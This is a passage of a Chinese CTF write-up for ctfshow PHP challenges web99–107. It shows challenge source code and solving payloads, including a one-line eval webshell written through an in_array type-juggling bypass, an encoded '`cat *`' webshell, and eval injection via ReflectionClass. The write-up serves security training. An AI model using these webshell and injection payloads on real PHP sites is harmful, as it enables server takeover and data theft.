class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看起来没什么问题，但是in_array函数有漏洞</p><p>in_array — 检查数组中是否存在某个值，</p><p>该函数并未将第三个参数设置为 true 时，攻击者可以通过构造的文件名来绕过服务端的检测，例如文件名为 7shell.php 。因为PHP在使用 <strong>in_array()</strong> 函数判断时，会将 <strong>7shell.php</strong> 强制转换成数字7</p><p>这样就通过file_put_contents构成一个任意文件上传漏洞，会在服务器新建一个7shell.php文件，向其中写入的值为content上传的字符串，写入一个一句话木马，则可以getshell，</p><pre class="line-numbers language-none"><code class="language-none">get:url&#x2F;?n&#x3D;1shell.phppost:content&#x3D;&lt;?php @eval($_POST[&#39;aaa&#39;]); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>传入成功后访问上传的1shell.php</p><p>url/1shell.php</p><p>通过post来执行命令：</p><pre class="line-numbers language-none"><code class="language-none">post:aaa&#x3D;phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到phpinfo界面，说明成功，接下来执行命令即可：</p><p><img src="/images/image-20210525161202774.png"></p><p>可以看到flag在flag36d.php中</p><p><img src="/images/image-20210525161305619.png" alt="image-20210525161305619"></p><p><img src="/images/image-20210525161313634.png" alt="image-20210525161313634"></p><h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-21 22:10:28# @link: https://ctfer.com*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag在ctfshow类里</p><p>通过get3个参数，来获得类中的flag，，其中v0必须是ture，对is_numeric对传入的三个参数进行判断，<strong>只要三个参数里有一个数字即可</strong>，（感觉不是应该三个都是吗，后续看看），v2不能有<code>;</code>,v3必须有<code>;</code>,可以通过实例化一个类来读flag：</p><pre class="line-numbers language-none"><code class="language-none">?v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可得到flag，也可以通过var_dump函数来输出变量相关信息</p><pre class="line-numbers language-none"><code class="language-none">?v1&#x3D;1$v2&#x3D;var_dump($ctfshow)&amp;v3&#x3D;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以得到flag</p><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-22 00:26:48# @link: https://ctfer.com*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和上一题一样，</p><pre class="line-numbers language-none"><code class="language-none">?v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可得到flag</p><h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: atao# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-23 20:59:43*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和之前相似但不相同，v2是要写入的webshell，想通过将一句话木马转为16进制，再通过函数hex2bin转换回来写入文件上传，最后getshell，因为is_numeric可以识别16进制，但失败了，</p><p><img src="/images/image-20210525185107887.png"></p><p>应该是因为php7中的is_numeric不支持16进制的识别了，只能换别的方法</p><p>真不会，看别人的wp，</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$a='&lt;?=`cat *`;';$b=base64_encode($a);  // PD89YGNhdCAqYDs=$c=bin2hex($b);      //这里直接用去掉=的base64输出   5044383959474e6864434171594473带e的话会被认为是科学计数法，可以通过is_numeric检测。大家可以尝试下去掉=和带着=的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里&lt;?=是php的短标签，是echo()的快捷用法，这样将输出的转换后的webshell以v2传入，v3进行文件包含，即可，但注意要在5044383959474e6864434171594473前加00因为substr会从第二个字符开始截取，</p><p>最后访问1.php即可</p><p><img src="/images/image-20210525192643703.png"></p><h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: atao# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-23 21:03:24*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*p.*h.*p.*/i"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sorry'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只是增加了一个过滤，看是否str中有p,h,p因为进行base64编码后的字符串中有p和h，所以直接和上一题一样就行</p><h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: atao# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-28 22:27:20*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不是很懂想干啥，直接传v1和v2相同的值就输出了flag</p><p><img src="/images/image-20210525193901100.png"></p><h3 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-28 22:34:07*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$error</span><span class="token operator">=</span><span class="token string single-quoted-string">'你还想要flag嘛？'</span><span class="token punctuation">;</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token string single-quoted-string">'既然你想要那给你吧！'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"your are good"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用变量覆盖，关键是<code>$$key=$$value;</code>,假如$key=aaa,则$$key=$aaa($aaa也是一个变量)</p><p>foreach中当前单元的键名也会在每次循环中被赋给变量 <code>$key</code>。值会赋值给<code>$value</code>,</p><p>所以，如果url/?aaa=flag则$key=aaa,$value=flag，所以：$$key=$$value即$aaa=$flag</p><p>$flag=ctfshow{xxxxx}，?dotast=flag，通过第一个for循环，以及$$key=$$value也就是$dotast=$flag，$dotast=ctfshow{xxxxx}，接着再通过第二个for循环，$error=$dotast，此时$error=ctfshow{xxxxx}</p><p>所以最后可以得到payload：</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?suces&#x3D;flagpost:error&#x3D;suces<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>过程为$suces=$flag=ctfshow{xxxxx}</p><p>$error=$suces=ctfshow{xxxxx}最后通过die($error)输出flag</p><p>也可以通过die(suces)输出flag</p><pre class="line-numbers language-none"><code class="language-none">?suces&#x3D;flag&amp;flag&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: atao# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-28 22:38:27*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$v1</span><span class="token operator">!=</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sha1函数，通过数组绕过即可</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?v2[]&#x3D;1post:v1[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/image-20210526220841213.png"></p><h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-28 23:24:14*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token 